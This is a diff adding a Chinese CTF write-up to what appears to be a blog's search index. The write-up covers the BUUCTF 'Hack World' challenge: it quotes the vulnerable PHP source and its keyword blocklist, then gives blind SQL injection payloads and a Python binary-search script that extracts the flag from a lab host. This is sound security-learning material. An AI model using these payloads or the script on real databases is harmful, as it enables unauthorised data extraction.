@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>2020.11.28刷题记录</title>
+      <link href="2020/11/28/2020-11-28-shua-ti-ji-lu/"/>
+      <url>2020/11/28/2020-11-28-shua-ti-ji-lu/</url>
+      
+        <content type="html"><![CDATA[<p>[CISCN2019 华北赛区 Day2 Web1]Hack World<br>源码</p><pre><code>&lt;?php$dbuser='root';$dbpass='root';function safe($sql){    $blackList = array(' ','||','#','-',';','&amp;','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./');    foreach($blackList as $blackitem){        if(stripos($sql,$blackitem)){            return False;        }    }    return True;}if(isset($_POST['id'])){    $id = $_POST['id'];}else{    die();}$db = mysql_connect("localhost",$dbuser,$dbpass);if(!$db){    die(mysql_error());}   mysql_select_db("ctf",$db); # 设置活动的数据库为ctfif(safe($id)){    $query = mysql_query("SELECT content from passage WHERE id = ${id} limit 0,1");    if($query){        $result = mysql_fetch_array($query);        if($result){            echo $result['content'];        }else{            echo "Error Occured When Fetch Result.";        }    }else{        var_dump($query);    }}else{    die("SQL Injection Checked.");}</code></pre><p>被过滤的字符</p><pre><code>' ','||','#','-',';','&amp;','+','or','and','`','"','insert','group','limit','update','delete','*','into','union','load_file','outfile','./'</code></pre><p>1.空格被过滤了,就看/*<em>/能不能代替,发现</em>也被过滤了,就试试Tab键来代替<br>2.过滤了and,&amp;和or,||<br>3.过滤了#和+<br>4.过滤了-<br>5.过滤了;<br>6.过滤了`<br>7.过滤了”<br>8.过滤了insert<br>9.过滤了group<br>10.过滤了limit<br>11.过滤了update<br>12.过滤了delete<br>13.过滤了into<br>14.过滤了union,联合注入没了<br>15,过滤了load_file和outfile<br>16.过滤了./<br>总结没有过滤ascii和left.substr和mid没有被过滤掉,可知可以使用盲注</p><pre><code>Eg:str="123456" mid(str,2,1)    结果为2Eg:substr(string, start, length)Eg:left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库名前二位。</code></pre><p><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2020-11-29_20-23-48.jpg"><br>我试了一下网上所谓的有bp爆破模块来测过滤了哪些字符(他的思路是如果过滤了的话,就被替代成空字符串了,应该和空字符串时,返回的长度是一样的),但是发现返回的长度都是一样,根本区别不了,难道是我的姿势不对吗?<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2020-11-29_16-08-46.jpg"><br>网上看到好多师傅用异或注入,我发现其实可以不用异或注入,直接盲注可以,payload的外面一定要一个()来包住,不然会报错id=(……),自己在改那个脚本时,一直报错后来加了一个time.sleep(0.1)就好了,二分法盲注比盲目盲注快一些<br>payload:(ascii(substr((select(flag)from(flag)),1,1))&gt;1)<br>payload:(ascii(substr(database(),1,1))&gt;64)<br>自己改的一个二分法求这题的盲注脚本</p><pre><code># encoding=gbkimport requestsimport reimport timeimport syssleep_time = 5error_time = 1def parse_url(url, data):    a = requests.post(url,data=data)    b = a.content.decode('gbk', 'ignore')    if a.status_code==200:        content=re.findall(r'&lt;/html&gt;\n(.*)', b, re.DOTALL)        return content[0]def getPayload(indexOfChar, mid):#(i,j+1,64)    # payload = "(ascii(substr(database()," + indexOfChar + ",1))&gt;" + mid + ")"  # 爆数据库,爆出来没有什么卵用    payload = "(ascii(substr((select(flag)from(flag)),"+ indexOfChar +",1))&gt;" + mid + ")"  # 爆flag    return payloaddef exce(indexOfChar, mid):  # (i,j+1,64)    time.sleep(0.1)    data = {        "id": "{}".format(getPayload(indexOfChar, mid))    }    url = "http://c0360be3-de97-4580-8d9f-ed4d3c649cb3.node3.buuoj.cn/index.php"    content = parse_url(url, data=data)    # print(content)    if "Hello, glzjin wants a girlfriend." in content:        return True    else:        return Falsedef doubleSearch(indexOfChar, left_number, right_number):  # (i,j,0,128)    while left_number &lt; right_number:  # 二分法来求        mid = int((left_number + right_number) / 2)  # mid=64        if exce(str(indexOfChar + 1), str(mid)):  # (i,j+1,64) (0,1,64)            left_number = mid        else:            right_number = mid        if left_number == right_number - 1:            if exce(str(indexOfChar + 1), str(mid)):                mid += 1                break            else:                break    return chr(mid)def search():    counter = 0    for j in range(80):  # 结果的长度        counter += 1        temp = doubleSearch(j, 0, 128)  # 从255开始查询        if ord(temp) == 1:  # 当为1的时候说明已经查询结束            break        sys.stdout.write(temp)        sys.stdout.flush()    sys.stdout.write("\r\n")    sys.stdout.flush()if __name__ == '__main__':    search()</code></pre><p>结果:<br><img src="https://gitee.com/secqin/tu/raw/master/img/Snipaste_2020-11-29_20-25-41.jpg"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf刷题记录 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ctf刷题记录 </tag>
+            
+            <tag> buuctf </tag>
+            
+            <tag> CISCN2019 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>正则表达式</title>
       <link href="2020/11/18/zheng-ze-biao-da-shi/"/>
       <url>2020/11/18/zheng-ze-biao-da-shi/</url>
